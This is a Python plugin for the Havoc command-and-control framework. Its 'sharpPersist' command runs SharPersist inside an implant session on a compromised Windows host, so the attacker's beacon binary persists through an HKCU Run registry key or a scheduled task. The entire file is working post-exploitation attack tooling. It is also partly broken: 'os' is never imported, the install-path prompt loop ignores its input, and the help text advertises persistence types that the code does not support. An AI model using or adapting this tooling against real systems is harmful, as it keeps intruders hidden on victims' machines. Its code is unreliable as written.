from havoc import Demon, RegisterCommand
from os import path
import havocui

sharp_current_dir = os.getcwd()
sharp_install_path = "/data/extensions/havoc-sharPersist/"
while not os.path.exists(sharp_current_dir + sharp_install_path):
    # Not installed through havoc-store, prompt for the path
    sharp_install_path = ""
    havocui.inputdialog("Install Path", "Please enter your install path here for the module to work correctly:")
AGENT_BIN = sharp_current_dir + sharp_install_path + "sharp.exe"

def sharpPersist(demonID, *param):	
    TaskID: str = None
    demon: Demon = None

    demon = Demon(demonID)

    if len(param) < 3:
        demon.ConsoleWrite(
            demon.CONSOLE_ERROR,
            "Not enough arguments. Please specify the path to the binary (demon.exe), the type of persistence (registry, scheduled tasks), and the method (add/remove).",
        )
        return False

    pathToBinary = param[0]
    PersisType = param[1]
    method = param[2]

    if demon.ProcessArch == "x86":
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "x86 architecture is not supported.")
        return False

    if not path.isfile(AGENT_BIN):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Could not find the Sharp binary. Please install it here or update the script: {AGENT_BIN}")
        return False
        
    demon.ConsoleWrite(demon.CONSOLE_ERROR, f"You are about to create persistence using {PersisType} with the method {method}. The binary {pathToBinary} will be executed.")

    if method == "remove":
        TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "We are about to delete your persistence!")
    elif method == "add":
        TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "We are about to execute sharp.exe within your beacon. Enjoy persistence! :)")
    else:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Invalid method: {method}. Please use 'add' or 'remove'.")
        return False
    
    if PersisType == "reg":
        demon.Command(TaskID, f"dotnet inline-execute {AGENT_BIN} -t reg -c \\\"C:\\Windows\\System32\\cmd.exe\\\" -a \\\"/c {pathToBinary}\\\" -k \"hkcurun\" -v \"{demonID}\" -m {method}")
        # SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c C:\Users\john\Desktop\beacon.exe" -k "hkcurun" -v "pwned" -m add
    elif PersisType == "schtask":
        demon.Command(TaskID, f"dotnet inline-execute {AGENT_BIN} -t schtask -c \\\"C:\\Windows\\System32\\cmd.exe\\\" -a \\\"/c {pathToBinary}\\\" -n \"{demonID}\" -m {method}")
    else:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Invalid Persist Type: {PersisType}. Please use 'schtask' or 'reg'.")
        return False



    return TaskID

RegisterCommand(sharpPersist, "", "sharpPersist", "Create persistence using the Sharp binary.", 3, "PathToBeaconBinary.exe schtasks/registry/startupfolder/tortoisesvn add/remove", "")

